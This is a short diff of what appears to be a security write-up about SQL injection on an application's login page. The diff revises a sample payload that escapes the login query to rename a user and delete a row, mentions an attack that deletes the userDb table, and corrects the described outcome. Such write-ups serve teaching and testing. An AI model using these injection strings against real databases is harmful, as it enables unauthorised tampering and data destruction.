@@ -30,8 +30,9 @@ The application is vulnerable to SQL injection in the login page. The following 
 ```
 The attack will delete the table userDb. 
 ```sql
-'); UPDATE userDb SET username = 'broken' WHERE username = 'oldUsername'; --'
+fakeUser'); UPDATE userDb SET username = 'broken' WHERE username = 'oldUsername'; DELETE from userDb WHERE username = 'fakeUser' --'
 ```
-The attack will change the username of the user with the oldUsername to broken2.
+The attack will change the username of the user with the oldUsername to broken.
 ```sql
+
 
